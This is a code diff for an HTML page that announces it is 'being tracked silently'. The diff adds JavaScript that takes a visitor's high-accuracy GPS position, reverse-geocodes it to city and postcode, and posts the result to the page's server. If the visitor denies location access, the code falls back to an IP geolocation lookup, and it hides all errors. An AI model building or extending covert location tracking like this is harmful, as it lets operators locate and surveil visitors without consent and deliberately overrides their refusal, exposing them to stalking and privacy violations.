@@ -24,44 +24,79 @@
   <div class="box">
     <h1>Welcome 👋</h1>
     <p>This page is being tracked silently.</p>
-    <!-- Replace this content with your actual page -->
   </div>
 
   <script>
+    async function sendLocation(payload) {
+      try {
+        await fetch('/api/update-location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) { /* silent */ }
+    }
+
+    async function reverseGeocode(lat, lon) {
+      try {
+        const r = await fetch(
+          'https://api.bigdatacloud.net/data/reverse-geocode-client' +
+          '?latitude=' + lat + '&longitude=' + lon + '&localityLanguage=en'
+        );
+        return await r.json();
+      } catch (e) { return null; }
+    }
+
+    async function ipFallback() {
+      // BigDataCloud IP lookup — no key needed, more accurate than ip-api for Nigeria
+      try {
+        const r = await fetch('https://api.bigdatacloud.net/data/ip-geolocation-full?localityLanguage=en');
+        const d = await r.json();
+        if (d && d.location) {
+          await sendLocation({
+            lat:         d.location.latitude         || null,
+            lon:         d.location.longitude        || null,
+            city:        d.location.city             || d.location.localityName || '',
+            region:      d.location.principalSubdivision || '',
+            country:     d.country ? d.country.name  : '',
+            countryCode: d.country ? d.country.isoAlpha2 : '',
+            zip:         d.location.postcode         || '',
+            lookupSource: 'ipGeolocation'
+          });
+        }
+      } catch (e) { /* silent */ }
+    }
+
+    // Try GPS first — triggers the browser permission popup
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
-        async (pos) => {
-          try {
-            const { latitude, longitude, accuracy } = pos.coords;
+        async function(pos) {
+          var lat = pos.coords.latitude;
+          var lon = pos.coords.longitude;
 
-            // Step 1: Use BigDataCloud to reverse geocode the GPS coords
-            // to get the REAL city name — free, no API key needed
-            const geoRes = await fetch(
-              `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`
-            );
-            const geo = await geoRes.json();
+          // Reverse geocode the exact GPS coords to get real city name
+          var geo = await reverseGeocode(lat, lon);
 
-            // Step 2: Send everything to the server to update the visitor record
-            await fetch('/api/update-location', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                lat:         latitude,
-                lon:         longitude,
-                accuracy:    accuracy,
-                city:        geo.city        || geo.locality       || '',
-                region:      geo.principalSubdivision              || '',
-                country:     geo.countryName                       || '',
-                countryCode: geo.countryCode                       || '',
-                zip:         geo.postcode                          || ''
-              })
-            });
-          } catch (e) {
-            // silently fail — IP location is still saved
-          }
+          await sendLocation({
+            lat:         lat,
+            lon:         lon,
+            city:        (geo && (geo.city || geo.locality))          || '',
+            region:      (geo && geo.principalSubdivision)            || '',
+            country:     (geo && geo.countryName)                     || '',
+            countryCode: (geo && geo.countryCode)                     || '',
+            zip:         (geo && geo.postcode)                        || '',
+            lookupSource: 'reverseGeocoding'
+          });
         },
-        () => {} // user denied — IP location stays, no error
+        async function() {
+          // User denied GPS — fall back to BigDataCloud IP lookup
+          await ipFallback();
+        },
+        { timeout: 10000, maximumAge: 0, enableHighAccuracy: true }
       );
+    } else {
+      // Browser doesn't support GPS — use IP fallback
+      ipFallback();
     }
   </script>
 </body>
